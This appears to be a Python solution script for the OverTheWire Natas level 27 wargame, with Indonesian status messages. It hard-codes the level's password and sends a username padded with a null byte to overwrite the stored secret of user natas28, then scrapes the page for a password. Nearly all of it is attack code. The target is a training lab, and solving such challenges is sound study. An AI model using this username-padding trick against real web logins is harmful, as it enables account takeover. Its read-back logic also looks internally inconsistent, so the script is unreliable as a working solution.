import requests
import re

NATAS_URL = "http://natas27.natas.labs.overthewire.org/"
NATAS_USERNAME = "natas27"
NATAS_PASSWORD = "u3RRffXjysjgwFU6b9xa23i6prmUsYne"
LOGIN_CREDENTIALS = (NATAS_USERNAME, NATAS_PASSWORD)

TARGET_USERNAME = "natas28" + "\x00" 
NEW_SECRET_PAYLOAD = "TEMPORARY_SECRET"

print(f"[*] Target URL: {NATAS_URL}")
print(f"[*] Payload Username: '{TARGET_USERNAME}'")
print("-" * 50)

try:
    print("[1/2] Melakukan POST payload untuk menimpa Secret pengguna natas28...")
    
    payload = {
        'username': TARGET_USERNAME,
        'password': 'foo',
        'secret': NEW_SECRET_PAYLOAD,
        'submit': 'Update'
    }
    
    response_exploit = requests.post(
        NATAS_URL, 
        auth=LOGIN_CREDENTIALS, 
        data=payload,
        allow_redirects=False
    )
    
    if response_exploit.status_code != 200:
        print(f"[-] Gagal mengirim POST payload. Status code: {response_exploit.status_code}")
        exit(1)

    print("[+] POST berhasil.")
    print("-" * 50)
    
    print("[2/2] Mengambil halaman utama (sebagai natas27) untuk mendapatkan Secret baru...")

    response_check = requests.get(
        NATAS_URL, 
        auth=LOGIN_CREDENTIALS
    )
    
    secret_match_1 = re.search(r'name="secret" value="([^"]+)"', response_check.text)
    secret_match_2 = re.search(r'The secret is\s*<b>([^<]+)</b>', response_check.text)
    
    current_secret = None
    if secret_match_1:
        current_secret = secret_match_1.group(1)
    elif secret_match_2:
        current_secret = secret_match_2.group(1)
        
    if current_secret:
        if current_secret != NEW_SECRET_PAYLOAD:
            print("\n" + "=" * 50)
            print(f"🎉 **SANDI NATAS 28 DITEMUKAN:** {current_secret}")
            print("=" * 50)
        else:
            print("[-] Payload berhasil dikirim, tetapi Secret masih menampilkan payload palsu Anda. Coba modifikasi TARGET_USERNAME.")
    else:
        print("[-] Gagal menemukan field 'secret' atau teks 'The secret is'. Periksa HTML halaman secara manual.")
        
except requests.exceptions.RequestException as e:
    print(f"[-] Terjadi kesalahan koneksi: {e}")